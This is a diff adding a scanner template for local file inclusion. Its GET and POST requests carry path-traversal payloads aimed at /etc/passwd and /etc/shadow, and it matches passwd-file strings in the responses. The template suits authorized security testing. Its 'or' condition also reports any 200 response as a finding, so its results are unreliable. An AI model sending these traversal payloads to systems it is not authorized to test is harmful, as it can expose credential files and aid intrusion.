@@ -1,0 +1,48 @@
+id: LFI-Detector
+
+info:
+  name: Local File Inclusion Detector
+  author: Reksy
+  severity: High
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?page=../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/?file=../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/?include=../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/?page=../../../../../../../../../../etc/shadow"
+      - "{{BaseURL}}/?file=../../../../../../../../../../etc/shadow"
+      - "{{BaseURL}}/?include=../../../../../../../../../../etc/shadow"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0:"
+          - "bin:x:1:1:"
+          - "/bin/bash"
+          - "nologin"
+        part: body
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    body: |
+      page=../../../../../../../../../../etc/passwd
+      file=../../../../../../../../../../etc/passwd
+      include=../../../../../../../../../../etc/passwd
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0:"
+          - "bin:x:1:1:"
+          - "/bin/bash"
+          - "nologin"
+        part: body
+      - type: status
+        status:
+          - 200
